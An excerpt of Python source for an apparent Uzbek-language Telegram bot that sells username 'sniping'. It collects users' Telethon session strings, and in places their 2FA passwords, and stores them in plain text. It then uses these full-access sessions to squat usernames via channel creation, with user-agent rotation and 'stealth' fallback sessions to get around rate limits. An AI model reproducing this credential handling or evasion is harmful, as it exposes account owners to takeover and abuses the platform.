            await db.execute("UPDATE users SET session_string=?, phone=? WHERE telegram_id=?", (session_string, phone, telegram_id))
        elif tg_password:
            await db.execute("UPDATE users SET session_string=?, tg_password=? WHERE telegram_id=?", (session_string, tg_password, telegram_id))
        else:
            await db.execute("UPDATE users SET session_string=? WHERE telegram_id=?", (session_string, telegram_id))
        await db.commit()

@router.message(F.text)
async def text_handler(message: Message):
    user_id = message.from_user.id
    state   = user_states.get(user_id, {})

    if state.get("step") == "wait_session":
        session = message.text.strip()
        # Session string juda qisqa bo'lsa qabul qilmaymiz
        if len(session) < 50:
            await message.answer("❌ Bu session string emas. Iltimos, to'g'ri session string yuboring.")
            return
        # Telefon raqamini ham olish uchun ulanamiz
        phone_fetched = None
        try:
            from telethon import TelegramClient
            from telethon.sessions import StringSession
            _c = TelegramClient(StringSession(session), API_ID, API_HASH)
            await _c.connect()
            if await _c.is_user_authorized():
                me = await _c.get_me()
                if me and me.phone:
                    phone_fetched = me.phone
            await _c.disconnect()
        except Exception:
            pass
        # Session ni bazaga saqlaymiz
        await save_session(user_id, session, phone_fetched)
        user_states.pop(user_id, None)
        await message.answer(
            "✅ <b>Akkaunt muvaffaqiyatli ulandi!</b>\n\n"
            "Endi '🛒 Username sotib olish' tugmasi orqali buyurtma bera olasiz.",
            reply_markup=main_menu(),
            parse_mode="HTML"
        )
        return

    if state.get("step") == "wait_category":
        user_states[user_id] = {"step": "wait_quantity", "category": message.text.strip()}
        price = int(await get_setting("username_price", 5000))
        await message.answer(
            f"✅ Kategoriya: <b>{message.text.strip()}</b>\n\n"
            f"Nechta username kerak? (1—10 ta)\n"
            f"💡 Narxi: <b>{price:,} so'm/dona</b>",
            parse_mode="HTML"
        )

    elif state.get("step") == "wait_quantity":
        try:
            qty = int(message.text.strip())
            if not 1 <= qty <= 10:
                raise ValueError
        except ValueError:
            await message.answer("❌ 1 dan 10 gacha son kiriting!")
            return

        price_per = int(await get_setting("username_price", 5000))
        total   = qty * price_per
        cat     = state["category"]
        user    = await get_user(user_id)
        balance = user["balance"] if user else 0

        markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=f"✅ Tasdiqlash ({total:,} so'm)", callback_data=f"order_{cat}_{qty}_{total}")],
            [InlineKeyboardButton(text="❌ Bekor qilish", callback_data="order_cancel")]
        ])
        await message.answer(
            f"📋 <b>Buyurtma tasdiqlash</b>\n\n"
            f"🏷 Kategoriya: <b>{cat}</b>\n"
            f"🔢 Miqdor: <b>{qty} ta</b>\n"
            f"💰 Narxi: <b>{total:,} so'm</b>\n"
            f"💳 Balansingiz: <b>{balance:,} so'm</b>\n\n"
            f"{'✅ Balans yetarli' if balance >= total else '❌ Balans yetarli emas. Avval to\'ldiring!'}",
            reply_markup=markup if balance >= total else None,
            parse_mode="HTML"
        )
        if balance < total:
            user_states.pop(user_id, None)

@router.callback_query(F.data == "order_cancel")
async def cancel_order(call: CallbackQuery):
    user_states.pop(call.from_user.id, None)
    await call.message.edit_text("❌ Buyurtma bekor qilindi.")

@router.callback_query(F.data.startswith("setprofile_"))
async def set_profile_username(call: CallbackQuery):
    data = call.data.split('_')
    username = data[1]
    channel_id = int(data[2])
    buyer_id = call.from_user.id
    
    buyer = await get_user(buyer_id)
    if not buyer or not buyer.get('session_string'):
        await call.answer("Akkauntingiz ulanmagan!", show_alert=True)
        return
        
    await call.answer("Jarayon boshlandi...")
    await call.message.edit_text(f"⏳ @{username} profilingizga o'rnatilmoqda...")
    
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.tl.functions.channels import DeleteChannelRequest
    from telethon.tl.functions.account import UpdateUsernameRequest as AccountUpdateUsernameRequest
    
    client = TelegramClient(StringSession(buyer['session_string']), API_ID, API_HASH)
    try:
        await client.connect()
        # 1. Kanaldan o'chiramiz
        await client(DeleteChannelRequest(channel=channel_id))
        
        # 2. Profilga qo'yamiz
        await client(AccountUpdateUsernameRequest(username=username))
        
        await call.message.edit_text(f"✅ <b>Tabriklaymiz!</b>\n\n@{username} muvaffaqiyatli sizning Telegram profilingizga o'rnatildi!", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Set profile error: {e}")
        await call.message.edit_text(f"❌ Xatolik yuz berdi: {e}\n\nKanal o'chirilgan bo'lishi mumkin. Telegramingizga kirib usernameni o'zingiz qo'yib ko'ring.")
    finally:
        await client.disconnect()

@router.callback_query(F.data.startswith("order_"))
async def place_order(call: CallbackQuery):
    data = call.data.split('_')
    if len(data) < 4: return
    cat = data[1]
    qty = int(data[2])
    total = int(data[3])
    user_id = call.from_user.id
    
    await deduct_balance(user_id, total)
    async with aiosqlite.connect(DB_PATH) as db:
        cur = await db.execute(
            "INSERT INTO orders (telegram_id, category, quantity, price, status, user_first_name) VALUES (?,?,?,?,'processing',?)",
            (user_id, cat, qty, total, call.from_user.first_name)
        )
        order_id = cur.lastrowid
        await db.commit()

    user_states.pop(user_id, None)
    await call.message.edit_text(
        f"✅ Buyurtma qabul qilindi!\n\n"
        f"🏷 Kategoriya: <b>{cat}</b>\n"
        f"🔢 Miqdor: <b>{qty} ta</b>\n"
        f"💰 To'langan: <b>{total:,} so'm</b>\n\n"
        f"⏳ Bot hozir username qidirishni boshlaydi. Topilgan nomlar sizga xabar qilinadi!",
        parse_mode="HTML"
    )

    # Fon rejimida username qidirish boshlash
    asyncio.create_task(run_sniper(call.bot, user_id, order_id, cat, qty))

# ─── SNIPER ───────────────────────────────────
async def run_sniper(bot, telegram_id, order_id, category, qty):
    """Fon rejimida qidirish va band qilish."""
    await search_sniper(telegram_id, order_id, category)
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT username FROM search_results WHERE search_id=?", (order_id,)) as c:
            found = [r[0] for r in await c.fetchall()]
    
    if found:
        # Eng yaxshi 'qty' ta nomni tanlash
        found_qty = min(len(found), qty)
        to_claim = found[:found_qty]
        
        if found_qty < qty:
            # Ortib qolganini qaytarish
            async with aiosqlite.connect(DB_PATH) as db:
                cur = await db.execute("SELECT price, quantity FROM orders WHERE id=?", (order_id,))
                order_row = await cur.fetchone()
                if order_row:
                    total_price = order_row[0]
                    requested_qty = order_row[1]
                    price_per_item = total_price // requested_qty if requested_qty > 0 else 0
                    refund_amount = (requested_qty - found_qty) * price_per_item
                    await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (refund_amount, telegram_id))
                    await db.execute("UPDATE orders SET price=?, quantity=? WHERE id=?", (found_qty * price_per_item, found_qty, order_id))
                    await db.commit()
            
            try:
                await bot.send_message(telegram_id, f"⚠️ <b>Diqqat:</b> Siz {qty} ta so'ragan edingiz, lekin faqat {found_qty} ta bo'sh username topildi.\n💸 Ortib qolgan pulingiz balansingizga qaytarildi.", parse_mode="HTML")
            except: pass
            
        await claim_sniper(bot, telegram_id, order_id, to_claim)
    else:
        # Hech narsa topilmadi
        async with aiosqlite.connect(DB_PATH) as db:
            cur = await db.execute("SELECT price FROM orders WHERE id=?", (order_id,))
            order_row = await cur.fetchone()
            if order_row:
                await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (order_row[0], telegram_id))
            await db.execute("UPDATE orders SET status='failed' WHERE id=?", (order_id,))
            await db.commit()
        try:
            await bot.send_message(telegram_id, "❌ Afsuski, bo'sh nom topilmadi. Barcha bo'lishi mumkin bo'lgan variantlar band ekan. Pulingiz qaytarildi.")
        except: pass

# ── TELETHON CLIENT CACHE ────────────────────────
_telethon_cache: dict = {}
_active_search_tasks: set = set()

async def _get_fast_client(session_string: str):
    """Keshdan tezkor Telethon client qaytaradi yoki yangisini yaratadi. 15s timeout."""
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    
    if session_string in _telethon_cache:
        client = _telethon_cache[session_string]
        try:
            if client.is_connected():
                return client
        except Exception:
            pass
        _telethon_cache.pop(session_string, None)
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=15.0)
    except Exception as e:
        logger.error(f"Telethon connect error: {e}")
        try:
            await client.disconnect()
        except Exception:
            pass
        raise e
    _telethon_cache[session_string] = client
    return client

async def search_sniper(telegram_id: int, search_id: int, category: str, lang: str = 'uz'):
    """Fast Hybrid HTTP + Telethon Verification bilan ultra-tezkor qidiruv."""
    import aiohttp
    found_count = 0
    paid_qty = 1
    charged_amount = 0
    used_free = 0

    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT paid_qty, charged_amount, used_free FROM search_tasks WHERE id=?", (search_id,)) as c:
                row = await c.fetchone()
                if row:
                    paid_qty = row[0] or 1
                    charged_amount = row[1] or 0
                    used_free = row[2] or 0
                else:
                    async with db.execute("SELECT quantity FROM orders WHERE id=?", (search_id,)) as oc:
                        orow = await oc.fetchone()
                        if orow:
                            paid_qty = orow[0] or 1

        targets = generate_usernames(category, lang=lang, limit=5000)

        # Generator nomlariga qo'shimcha kombinatsiyalar
        extra_targets = []
        for t in targets[:300]:
            extra_targets.extend([
                f"{t}_uz", f"{t}_official", f"{t}_bot", f"{t}2025", f"{t}2026",
                f"real_{t}", f"{t}_me", f"the_{t}", f"{t}_pro", f"{t}1", f"{t}7",
                f"{t}99", f"{t}777", f"{t}_vip", f"{t}_tv", f"{t}_top",
                f"my{t}", f"mr{t}", f"{t}hub", f"{t}lab", f"{t}hq",
                f"go{t}", f"{t}go", f"{t}x", f"{t}ai", f"neo{t}"
            ])
        random.shuffle(extra_targets)

        # 5-32 belgili va toza Telegram username talablariga moslash
        TELEGRAM_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9_]{3,30}[a-zA-Z0-9]$')
        all_targets = []
        seen_t = set()
        for u in targets + extra_targets:
            u_clean = str(u).strip().lower()
            if (u_clean not in seen_t
                    and 5 <= len(u_clean) <= 32
                    and '__' not in u_clean
                    and not u_clean.startswith('_')
                    and not u_clean.endswith('_')
                    and bool(TELEGRAM_RE.match(u_clean))):
                seen_t.add(u_clean)
                all_targets.append(u_clean)

        user = await get_user(telegram_id)
        session_string = user["session_string"] if user else None
        stealth_session_used = None

        if not session_string:
            stealth_sessions = os.getenv("STEALTH_SESSIONS", "").split(",")
            stealth_sessions = [s.strip() for s in stealth_sessions if s.strip()]
            if not stealth_sessions and 'STEALTH_SESSIONS' in globals() and STEALTH_SESSIONS:
                stealth_sessions = STEALTH_SESSIONS
            if stealth_sessions:
                session_string = stealth_sessions[0]
                stealth_session_used = session_string

        telethon_client = None
        if session_string:
            try:
                telethon_client = await _get_fast_client(session_string)
            except Exception as e:
                logger.warning(f"Search sniper telethon client error: {e}")
                stealth_sessions = os.getenv("STEALTH_SESSIONS", "").split(",")
                stealth_sessions = [s.strip() for s in stealth_sessions if s.strip()]
                if not stealth_sessions and 'STEALTH_SESSIONS' in globals() and STEALTH_SESSIONS:
                    stealth_sessions = STEALTH_SESSIONS
                if stealth_sessions and stealth_sessions[0] != session_string:
                    try:
                        session_string = stealth_sessions[0]
                        stealth_session_used = session_string
                        telethon_client = await _get_fast_client(session_string)
                    except Exception as se:
                        logger.warning(f"Search sniper stealth telethon client fallback error: {se}")
                        telethon_client = None

        from telethon.tl.functions.account import CheckUsernameRequest
        from telethon.errors import UsernamePurchaseAvailableError, UsernameInvalidError

        req_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        start_time = asyncio.get_event_loop().time()
        MAX_SECONDS = 100

        found_lock = asyncio.Lock()
        found_usernames_set = set()

        async def check_via_telethon(uname: str) -> bool:
            if not telethon_client or not telethon_client.is_connected():
                return False
            try:
                res = await asyncio.wait_for(
                    telethon_client(CheckUsernameRequest(uname)),
                    timeout=4.0
                )
                return bool(res is True)
            except Exception as e:
                logger.debug(f"Telethon check error/occupied for @{uname}: {e}")
                return False

        async def check_via_http(http_session, uname: str) -> str:
            try:
                async with http_session.get(
                    f"https://t.me/{uname}",
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=2.5),
                    headers={'User-Agent': random.choice(headers_list)}
                ) as resp:
                    if resp.status == 429:
                        await asyncio.sleep(0.5)
                        return 'unknown'
                    text = await resp.text()
                    # Aniq band bo'lgan sahifalar (profil, kanal, guruh, bot, fragment auksioni)
                    taken_markers = (
                        'tgme_page_title', 'tgme_page_extra', 'tgme_page_photo',
                        'tgme_page_action', 'tgme_action_button_new', 'tgme_page_icon',
                        'fragment.com', 'tgme_page_description', 'tgme_header_title',
                        'tgme_body_wrap', 'tgme_channel_info', 'auction'
                    )
                    if any(k in text for k in taken_markers):
                        return 'taken'
                    return 'maybe_free'
            except asyncio.TimeoutError:
                return 'unknown'
            except Exception:
                return 'unknown'

        async def verify_target(http_session, uname: str):
            nonlocal found_count

            async with found_lock:
                if found_count >= max(25, paid_qty * 5):
                    return
                if uname in found_usernames_set:
                    return

            try:
                # 1. HTTP dastlabki süzgich: Aniq band bo'lsa darhol rad etish
                http_result = await check_via_http(http_session, uname)
                if http_result == 'taken':
                    return

                # 2. Telethon API QAT'IY tasdig'i: Faqat API 'True' (bo'sh) deb bersagina muvaffaqiyatli deb olamiz
                is_free = False
                if telethon_client and telethon_client.is_connected():
                    is_free = await check_via_telethon(uname)

                if is_free:
                    async with found_lock:
                        if found_count >= max(25, paid_qty * 5):
                            return
                        if uname in found_usernames_set:
                            return
                        found_usernames_set.add(uname)
                        found_count += 1

                    try:
                        async with aiosqlite.connect(DB_PATH) as db:
                            await db.execute(
                                "INSERT OR IGNORE INTO search_results (search_id, username) VALUES (?,?)",
                                (search_id, uname)
                            )
                            await db.commit()
                    except Exception as db_err:
                        logger.error(f"DB insert error for {uname}: {db_err}")
            except Exception as e:
                logger.debug(f"verify_target error for {uname}: {e}")

        async with aiohttp.ClientSession(headers=req_headers) as http_session:
            batch_size = 30
            for i in range(0, len(all_targets), batch_size):
                elapsed = asyncio.get_event_loop().time() - start_time
                if elapsed > MAX_SECONDS:
                    logger.info(f"Search {search_id}: time limit reached ({elapsed:.1f}s)")
                    break
                async with found_lock:
                    cur_found = found_count
                if cur_found >= max(25, paid_qty * 5):
                    logger.info(f"Search {search_id}: found enough ({cur_found})")
                    break

                batch = all_targets[i:i+batch_size]
                tasks = [verify_target(http_session, u) for u in batch]
                await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.02)

        logger.info(f"Search {search_id} done. Total found: {found_count}")

    except Exception as e:
        logger.error(f"Search task error: {e}")
    finally:
        if telethon_client:
            try:
                if telethon_client.is_connected():
                    await telethon_client.disconnect()
            except Exception as err:
                logger.debug(f"Error disconnecting telethon_client: {err}")
        if session_string:
            _telethon_cache.pop(session_string, None)
        if stealth_session_used:
            _telethon_cache.pop(stealth_session_used, None)

        async with aiosqlite.connect(DB_PATH) as db:
            if found_count == 0:
                async with db.execute("SELECT charged_amount, used_free FROM search_tasks WHERE id=?", (search_id,)) as c:
                    task_info = await c.fetchone()
                    if task_info:
                        charged = task_info[0] or 0
                        ufree = task_info[1] or 0
                        if charged > 0:
                            logger.warning(f"Search {search_id}: 0 results, refunding {charged} so'm to user {telegram_id}")
                            await db.execute("UPDATE users SET balance = balance + ? WHERE telegram_id=?", (charged, telegram_id))
                        if ufree > 0:
                            logger.warning(f"Search {search_id}: 0 results, restoring free_search for user {telegram_id}")
                            await db.execute("UPDATE users SET free_searches = MIN(1, IFNULL(free_searches, 0) + 1) WHERE telegram_id=?", (telegram_id,))
                        await db.commit()

            await db.execute("UPDATE search_tasks SET status='completed' WHERE id=?", (search_id,))
            await db.commit()


async def claim_sniper(bot, telegram_id: int, order_id: int, usernames: list):
    """Foydalanuvchi tanlagan aniq usernamelarni band qiladi."""
    try:
        user = await get_user(telegram_id)
        session_string = user["session_string"]
        
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.errors import FloodWaitError
        from telethon.tl.functions.channels import CreateChannelRequest, UpdateUsernameRequest, DeleteChannelRequest
        
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        claimed = []
        failed_reasons = []
        deferred = []  # FloodWait tufayli keyinga qoldirilganlar
        
        try:
            for username in usernames:
                try:
                    ch = None
                    try:
                        ch = await client(CreateChannelRequest(title=username.capitalize(), about="@usernamechi_bot orqali band qilingan", megagroup=False))
                        ch_id = ch.chats[0].id
                        await client(UpdateUsernameRequest(channel=ch_id, username=username))
                        
                        claimed.append(username)
                        async with aiosqlite.connect(DB_PATH) as db:
                            await db.execute("INSERT INTO registered_usernames (order_id, username) VALUES (?,?)", (order_id, username))
                            await db.execute("UPDATE orders SET registered_count=registered_count+1 WHERE id=?", (order_id,))
                            await db.commit()
                    except Exception as inner_e:
                        err_msg = str(inner_e)
                        err_type = type(inner_e).__name__
                        logger.error(f"Claim failed for {username}: {err_type} - {err_msg}")
                        
                        if "UserRestricted" in err_type:
                            human_reason = "Akkauntingiz Telegram tomonidan cheklangan (SpamBlock)"
                        elif "ChannelsAdminPublicTooMuch" in err_type:
                            human_reason = "Sizda maksimal 10 ta ommaviy kanal bor (Limit)"
                        elif "UsernameInvalid" in err_type:
                            human_reason = "Bu nom Telegram qoidalariga zid yoki auksionda"
                        elif "UsernameOccupied" in err_type:
                            human_reason = "Ushbu nom kimgadir tegishli bo'lib ulgurgan"
                        elif "UsernamePurchaseAvailable" in err_type:
                            human_reason = "Bu nom Fragment auksionida pulga sotilmoqda"
                        else:
                            human_reason = f"Telegram ruxsat bermadi ({err_type})"
                            
                        failed_reasons.append(f"@{username} — <b>{human_reason}</b>")
                        
                        if ch:
                            try:
                                await client(DeleteChannelRequest(channel=ch.chats[0].id))
                            except:
                                pass
                        if "ChannelsAdminPublicTooMuch" in err_type:
                            await bot.send_message(telegram_id, "❌ <b>Diqqat:</b> Ommaviy link yaratish limiti tugagan! Telegram ruxsat bermadi.", parse_mode="HTML")
                            break
                    await asyncio.sleep(1)
                except FloodWaitError as e:
                    logger.warning(f"FloodWait during claim: {e.seconds}s for {username}")
                    # Bu va keyingi barcha usernamelarni keyinga qoldirish
                    deferred.append(username)
                    # Qolgan username larni ham deferred ga qo'shish
                    remaining_idx = usernames.index(username) + 1
                    deferred.extend(usernames[remaining_idx:])
                    
                    # FloodWait tugash vaqtini saqlash
                    import time
                    floodwait_until = time.time() + e.seconds
                    import json as _json
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute(
                            "UPDATE orders SET floodwait_until=?, pending_usernames=?, status='floodwait' WHERE id=?",
                            (floodwait_until, _json.dumps(deferred), order_id)
                        )
                        await db.commit()
                    
                    # Foydalanuvchiga xabar berish
                    secs = e.seconds
                    if secs >= 3600:
                        time_str = f"{secs // 3600} soat {(secs % 3600) // 60} daqiqa"
                    elif secs >= 60:
                        time_str = f"{secs // 60} daqiqa"
                    else:
                        time_str = f"{secs} soniya"
                    
                    # Foydalanuvchi ismini va tanlangan usernamelarni olish
                    async with aiosqlite.connect(DB_PATH) as db:
                        async with db.execute("SELECT user_first_name FROM orders WHERE id=?", (order_id,)) as c:
                            order_row = await c.fetchone()
                        user_first_name = (order_row[0] or "Foydalanuvchi") if order_row else "Foydalanuvchi"
                    
                    usernames_list = "\n".join(f"\u2022 @{u}" for u in deferred)
                    
                    await bot.send_message(
                        telegram_id,
                        f"\u23f3 <b>Hurmatli {user_first_name}!</b>\n\n"
                        f"Telegram cheklovi <b>{time_str}</b> dan keyin ochiladi.\n\n"
                        f"<b>Tanlagan usernamengiz:</b>\n{usernames_list}\n\n"
                        f"\U0001f916 Cheklov ochilishi bilan yuqoridagi usernamelar avtomatik <b>band qilinadi</b> va sizga xabar yuboriladi.\n\n"
                        f"<i>Hech narsani qilishingiz shart emas \u2014 bot o'zi kuzatib boradi.</i>",
                        parse_mode="HTML"
                    )
                    break
                except Exception as e:
                    logger.error(f"Claim xato: {e}")
        finally:
            await client.disconnect()
        
        # Agar deferred bo'lmasa - buyurtmani yakunlash
        if not deferred:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE orders SET status='completed' WHERE id=?", (order_id,))
                
                # Agar hech narsa olinmagan bo'lsa, pulni to'liq qaytarish (refund)
                if len(claimed) == 0:
                    cur = await db.execute("SELECT price FROM orders WHERE id=?", (order_id,))
                    order_row = await cur.fetchone()
                    if order_row and order_row[0]:
                        refund_amount = order_row[0]
                        await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (refund_amount, telegram_id))
                        
                await db.commit()
                
            msg = f"🎉 <b>Buyurtma yakunlandi!</b>\nJami band qilindi: <b>{len(claimed)} ta</b>\n"
            if claimed:
                msg += "\n".join(f"✅ @{u}" for u in claimed)
            else:
                msg += "❌ Hech qanday nom olinmadi.\n\n<b>Sabablari:</b>\n" + "\n".join(failed_reasons)
                msg += "\n\n<i>To'langan pul balansingizga to'liq qaytarildi (Refund). Boshqa akkaunt bilan urinib ko'ring!</i>"
                
            await bot.send_message(telegram_id, msg, parse_mode="HTML")
        elif claimed:
            # Ba'zilari olingan, ba'zilari deferred
            msg = f"✅ <b>{len(claimed)} ta</b> username band qilindi:\n"
            msg += "\n".join(f"✅ @{u}" for u in claimed)
            msg += f"\n\n⏳ <b>{len(deferred)} tasi</b> blok tugagach avtomatik band qilinadi."
            await bot.send_message(telegram_id, msg, parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Claim task xato: {e}")
        try:
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE orders SET status='failed' WHERE id=?", (order_id,))
                cur = await db.execute("SELECT price FROM orders WHERE id=?", (order_id,))
                order_row = await cur.fetchone()
                if order_row and order_row[0]:
                    await db.execute("UPDATE users SET balance=balance+? WHERE telegram_id=?", (order_row[0], telegram_id))
                await db.commit()
            await bot.send_message(
                telegram_id, 
                f"❌ <b>Band qilishda xatolik yuz berdi:</b>\n<code>{e}</code>\n\n<i>To'langan pul balansingizga qaytarildi. Akkauntingiz ulanishini tekshiring!</i>",
                parse_mode="HTML"
            )
        except Exception:
            pass

async def deferred_claim_loop(bot):
    """Blok muddati o'tgan buyurtmalarni avtomatik band qiladi."""
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import FloodWaitError
    from telethon.tl.functions.channels import CreateChannelRequest, UpdateUsernameRequest, DeleteChannelRequest
    import time
    import json as _json
    
    while True:
        try:
            now = time.time()
            async with aiosqlite.connect(DB_PATH) as db:
                db.row_factory = aiosqlite.Row
                async with db.execute(
                    "SELECT id, telegram_id, price, pending_usernames FROM orders WHERE status='floodwait' AND floodwait_until <= ?",
                    (now,)
                ) as c:
                    due_orders = await c.fetchall()
            
            for order in due_orders:
                order_id = order['id']
                telegram_id = order['telegram_id']
                try:
                    usernames = _json.loads(order['pending_usernames'] or '[]')
                except:
                    usernames = []
                
                if not usernames:
                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("UPDATE orders SET status='completed' WHERE id=?", (order_id,))
                        await db.commit()
                    continue
                
                logger.info(f"Deferred claim: order {order_id}, {len(usernames)} usernames")
                
                # Status qayta ko'rib chiqish — hozir band qilishga urinish
                async with aiosqlite.connect(DB_PATH) as db:
                    await db.execute("UPDATE orders SET status='processing', pending_usernames='', floodwait_until=0 WHERE id=?", (order_id,))
                    await db.commit()
                
                # Fon rejimida band qilishni boshlash
                asyncio.create_task(claim_sniper(bot, telegram_id, order_id, usernames))
                
        except Exception as e:
            logger.error(f"Deferred claim loop xato: {e}")
        
        await asyncio.sleep(60)  # Har 60 soniyada tekshirish

async def monitoring_loop(bot):
    """Orqa fonda barcha monitoring_tasks larni yuqori tezlikda poylaydi."""
    from telethon.tl.functions.channels import CreateChannelRequest, UpdateUsernameRequest, DeleteChannelRequest
    from telethon.tl.types import InputChannel
    from telethon.errors import (
        FloodWaitError, ChannelsAdminPublicTooMuchError, 
        UsernameOccupiedError, UsernameInvalidError, 
        UserRestrictedError
    )
    import aiohttp
    import random

    headers_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'
    ]

    global instant_check_queue
    instant_check_queue = asyncio.Queue()

    hdr_idx = 0
    global_429_count = 0          # t.me dan 429 hisoblagich
    claiming_now: set = set()     # Hozir band qilinayotgan username'lar
    session_floodwait: dict = {}  # {session_hash: until_timestamp}
    spamblocked_sessions: set = set()  # SpamBlock bo'lgan sessiyalar
    taken_usernames_cache: dict = {}   # {uname_lower: expiry_ts} — Band/muzlatilgan nomlar keshi (12 soat TTL)
    last_channel_created: dict = {}    # {session_hash: timestamp}
    last_checked_ts: dict = {}         # {uname_lower: last_check_time} — har bir nom uchun oxirgi tekshiruv vaqti
    CHECK_INTERVAL = 5.0               # Har bir username minimum 5 soniyada bir tekshiriladi
    last_monitor_log_ts = 0.0          # Monitoring log spamini oldini olish uchun

    async def _claim_username(task_group, uname, http_session):
        """Username bo'shagan — darhol band qilishga urinamiz (alohida task)."""
        nonlocal claiming_now, session_floodwait, spamblocked_sessions, taken_usernames_cache, last_channel_created
        if uname in claiming_now:
            return
        claiming_now.add(uname)
        logger.info(f"🎯 [CLAIM START] @{uname} bo'sh joy sarlavhasi aniqlandi! Jarayon boshlanmoqda...")
        try:
            # 2-tekshiruv: HTTP orqali hali ham band ekanligini qayta tekshiramiz
            taken_markers = (
                'tgme_page_title', 'tgme_page_extra', 'tgme_page_photo',
                'tgme_page_action', 'tgme_action_button_new', 'tgme_page_icon',
                'fragment.com', 'tgme_page_description'
            )
            try:
                async with http_session.get(
                    f"https://t.me/{uname}", allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=2.0),
                    headers={'User-Agent': headers_list[hdr_idx]}
                ) as resp2:
                    text2 = await resp2.text()
                    if any(k in text2 for k in taken_markers):
                        logger.info(f"⚠️ [CLAIM CANCEL] @{uname} 2-tekshiruvda (HTTP) band.")
                        taken_usernames_cache[uname.lower()] = time.time() + 43200  # 12 soat
                        return
            except Exception as e2:
                logger.debug(f"2-tekshiruv xatosi: {e2}")

            # 3-tekshiruv: Telethon CheckUsernameRequest orqali API darajasida QAT'IY tasdiqlash
            _check_client = None
            api_confirmed_free = False
            try:
                from telethon.tl.functions.account import CheckUsernameRequest
                from telethon.errors import UsernamePurchaseAvailableError, UsernameInvalidError
                _first_task = next((t for t in task_group if t.get("session_string")), None)
                if _first_task:
                    _check_client = await _get_fast_client(_first_task["session_string"])
                    _api_result = await asyncio.wait_for(
                        _check_client(CheckUsernameRequest(uname)),
                        timeout=5.0
                    )
                    if _api_result is True:
                        api_confirmed_free = True
                        logger.info(f"✅ [API CONFIRM] @{uname} Telethon API bo'shligini tasdiqladi — kanal ochilmoqda...")
                    else:
                        logger.info(f"⚠️ [CLAIM CANCEL] @{uname} Telethon API bo'sh emas (False).")
                        taken_usernames_cache[uname.lower()] = time.time() + 43200
                        return
            except (UsernamePurchaseAvailableError,):
                logger.info(f"💰 [CLAIM CANCEL] @{uname} Fragment auksionida.")
                taken_usernames_cache[uname.lower()] = time.time() + 43200
                return
            except (UsernameInvalidError,):
                logger.info(f"⛔ [CLAIM CANCEL] @{uname} yaroqsiz username.")
                taken_usernames_cache[uname.lower()] = time.time() + 43200
                return
            except Exception as ce:
                logger.debug(f"CheckUsernameRequest failed for @{uname}: {ce}")
                taken_usernames_cache[uname.lower()] = time.time() + 3600
                return
            finally:
                if _check_client and _first_task:
                    try:
                        await _check_client.disconnect()
                    except Exception: pass
                    _telethon_cache.pop(_first_task.get("session_string"), None)

            if not api_confirmed_free:
                return

            username_is_taken = False
            valid_sessions_count = 0
            
            for task in task_group:
                if username_is_taken:
                    break
                if not task["session_string"]:
                    continue

                valid_sessions_count += 1
                sess_key = str(hash(task["session_string"]))

                if sess_key in spamblocked_sessions:
                    logger.debug(f"⛔ Sessiya {task['telegram_id']} SpamBlock ekanligi uchun o'tkazildi.")
                    continue

                fw_until = session_floodwait.get(sess_key, 0)
                if fw_until > time.time():
                    remaining = int(fw_until - time.time())
                    logger.debug(f"⏭ Sessiya {task['telegram_id']} FloodWait ({remaining}s) uchun o'tkazildi.")
                    continue

                last_created = last_channel_created.get(sess_key, 0)
                if time.time() - last_created < 5.0:
                    logger.debug(f"⏭ Sessiya {task['telegram_id']} 5s limit sababli kutmoqda.")
                    await asyncio.sleep(5.0 - (time.time() - last_created))

                ch = None
                ch_id = None
                ch_access_hash = None
                client = None
                success = False
                try:
                    logger.info(f"🔑 User {task['telegram_id']} sessiyasi bilan @{uname} uchun kanal ochilmoqda...")
                    client = await _get_fast_client(task["session_string"])
                    
                    last_channel_created[sess_key] = time.time()
                    ch = await client(CreateChannelRequest(
                        title=uname.capitalize(),
                        about="@usernamechi_bot orqali band qilingan",
                        megagroup=False
                    ))
                    ch_id = ch.chats[0].id
                    ch_access_hash = ch.chats[0].access_hash
                    logger.info(f"📺 Kanal yaratildi (ID: {ch_id}). @{uname} biriktirilmoqda...")
                    
                    await client(UpdateUsernameRequest(
                        channel=InputChannel(ch_id, ch_access_hash),
                        username=uname
                    ))
                    success = True

                    async with aiosqlite.connect(DB_PATH) as db:
                        await db.execute("UPDATE monitoring_tasks SET status='claimed' WHERE id=?", (task["id"],))
                        await db.commit()
                    try:
